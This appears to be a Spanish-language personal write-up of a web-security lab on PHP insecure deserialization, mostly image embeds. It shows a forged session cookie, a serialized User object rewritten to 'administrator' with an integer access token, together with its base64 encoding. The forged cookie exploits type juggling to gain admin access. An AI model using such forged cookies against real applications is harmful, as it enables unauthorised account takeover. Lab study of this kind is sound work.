![[Pasted image 20220924204432.png]]

para este caso se recomienda utilizar el plugin Hackvertor

![[Pasted image 20220924204949.png]]

![[Pasted image 20220924205013.png]]

Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiJlbDZ5YmpldHJpYWlvd3R2NDR5djdwZ2hzOWJ1ZDNjMSI7fQ%3d%3d

envio al repeater el GET My Account:

![[Pasted image 20220924205219.png]]

![[Pasted image 20220924205313.png]]

esto seran los cambios en la cookie:

-   Update the length of the `username` attribute to `13`.
-   Change the username to `administrator`.
-   Change the access token to the integer `0`. As this is no longer a string, you also need to remove the double-quotes surrounding the value.
-   Update the data type label for the access token by replacing `s` with `i`.

The result should look like this:

`O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}`

![[Pasted image 20220924205416.png]]

Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9

![[Pasted image 20220924205504.png]]

hago el cambio en el browser:

![[Pasted image 20220924205547.png]]

![[Pasted image 20220924205613.png]]
